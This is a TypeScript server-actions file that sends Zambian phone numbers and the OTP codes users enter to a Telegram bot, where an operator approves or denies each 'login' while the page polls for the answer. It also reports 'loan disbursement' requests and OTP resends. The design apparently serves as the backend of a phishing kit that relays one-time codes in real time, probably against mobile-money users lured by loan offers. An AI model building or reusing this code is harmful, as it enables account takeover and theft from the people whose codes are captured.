"use server"

// In-memory store for pending approval requests. Uses globalThis so it survives
// dev-mode HMR module reloads within the single Node server process.
type ApprovalStatus = "pending" | "approved" | "denied"

type ApprovalStore = {
  requests: Map<string, ApprovalStatus>
  offset: number
}

const store: ApprovalStore = ((globalThis as any).__momoApproval ??= {
  requests: new Map<string, ApprovalStatus>(),
  offset: 0,
})

function credentials() {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID
  return { token, chatId }
}

function lusakaTime() {
  return new Date().toLocaleString("en-GB", {
    timeZone: "Africa/Lusaka",
    dateStyle: "medium",
    timeStyle: "medium",
  })
}

// Sends an OTP approval request to Telegram with Verify / Deny inline buttons.
export async function requestApproval({
  phone,
  otp,
}: {
  phone: string
  otp: string
}) {
  const { token, chatId } = credentials()
  if (!token || !chatId) {
    console.log("[v0] Telegram credentials missing")
    return { ok: false as const, error: "not_configured" }
  }

  const id = Math.random().toString(36).slice(2, 10)
  store.requests.set(id, "pending")

  const text = [
    "🔐 *OTP Verification Request*",
    "",
    `📱 *Phone:* \`+260${phone}\``,
    `🔢 *Code entered:* \`${otp}\``,
    `🕒 *Time:* ${lusakaTime()} (CAT)`,
    "",
    "Approve this login?",
  ].join("\n")

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Verify", callback_data: `approve:${id}` },
              { text: "❌ Deny", callback_data: `deny:${id}` },
            ],
          ],
        },
      }),
    })

    if (!res.ok) {
      const body = await res.text()
      console.log("[v0] Telegram sendMessage error:", res.status, body)
      store.requests.delete(id)
      return { ok: false as const, error: "send_failed" }
    }

    return { ok: true as const, id }
  } catch (err) {
    console.log("[v0] Telegram request failed:", (err as Error).message)
    store.requests.delete(id)
    return { ok: false as const, error: "request_failed" }
  }
}

// Sends a loan disbursement approval request to Telegram with Verify / Deny buttons.
export async function requestDisbursement({
  phone,
  amount,
}: {
  phone: string
  amount: string
}) {
  const { token, chatId } = credentials()
  if (!token || !chatId) {
    console.log("[v0] Telegram credentials missing")
    return { ok: false as const, error: "not_configured" }
  }

  const id = Math.random().toString(36).slice(2, 10)
  store.requests.set(id, "pending")

  const formatted = Number(amount).toLocaleString("en-ZM", { maximumFractionDigits: 2 })
  const text = [
    "💰 *Loan Disbursement Request*",
    "",
    `📱 *Phone:* \`+260${phone}\``,
    `🏦 *Amount:* \`K${formatted}\` ZMW`,
    `🕒 *Time:* ${lusakaTime()} (CAT)`,
    "",
    "Approve this disbursement?",
  ].join("\n")

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Verify", callback_data: `approve:${id}` },
              { text: "❌ Deny", callback_data: `deny:${id}` },
            ],
          ],
        },
      }),
    })

    if (!res.ok) {
      const body = await res.text()
      console.log("[v0] Telegram sendMessage error:", res.status, body)
      store.requests.delete(id)
      return { ok: false as const, error: "send_failed" }
    }

    return { ok: true as const, id }
  } catch (err) {
    console.log("[v0] Telegram disbursement request failed:", (err as Error).message)
    store.requests.delete(id)
    return { ok: false as const, error: "request_failed" }
  }
}

// Consumes pending callback_query updates from Telegram and returns the status
// for the given request id. Called repeatedly by the client while waiting.
export async function pollApproval(id: string) {
  const { token } = credentials()
  if (!token) return { status: "pending" as ApprovalStatus }

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${token}/getUpdates?offset=${store.offset}&timeout=0&allowed_updates=${encodeURIComponent(
        '["callback_query"]',
      )}`,
    )
    const data = await res.json()

    if (data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        store.offset = Math.max(store.offset, update.update_id + 1)
        const cq = update.callback_query
        if (!cq?.data) continue

        const [action, reqId] = String(cq.data).split(":")
        const decision: ApprovalStatus = action === "approve" ? "approved" : "denied"
        if (store.requests.has(reqId)) {
          store.requests.set(reqId, decision)
        }

        // Acknowledge the button tap and update the original message.
        await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            callback_query_id: cq.id,
            text: decision === "approved" ? "Approved ✅" : "Denied ❌",
          }),
        }).catch(() => {})

        if (cq.message) {
          await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: cq.message.chat.id,
              message_id: cq.message.message_id,
              text:
                `${cq.message.text}\n\n` +
                (decision === "approved"
                  ? "✅ *Approved* — login allowed."
                  : "❌ *Denied* — login rejected."),
              parse_mode: "Markdown",
            }),
          }).catch(() => {})
        }
      }
    }
  } catch (err) {
    console.log("[v0] Telegram poll failed:", (err as Error).message)
  }

  return { status: (store.requests.get(id) ?? "pending") as ApprovalStatus }
}

// Sends a notification that the user requested a new OTP.
export async function notifyResend({ phone }: { phone: string }) {
  const { token, chatId } = credentials()
  if (!token || !chatId) return { ok: false as const }

  const text = [
    "🔄 *OTP Resent*",
    "",
    `📱 *Phone:* \`+260${phone}\``,
    `🕒 *Time:* ${lusakaTime()} (CAT)`,
    "",
    "A new verification code was requested.",
  ].join("\n")

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" }),
    })
    return { ok: true as const }
  } catch (err) {
    console.log("[v0] Telegram resend notify failed:", (err as Error).message)
    return { ok: false as const }
  }
}
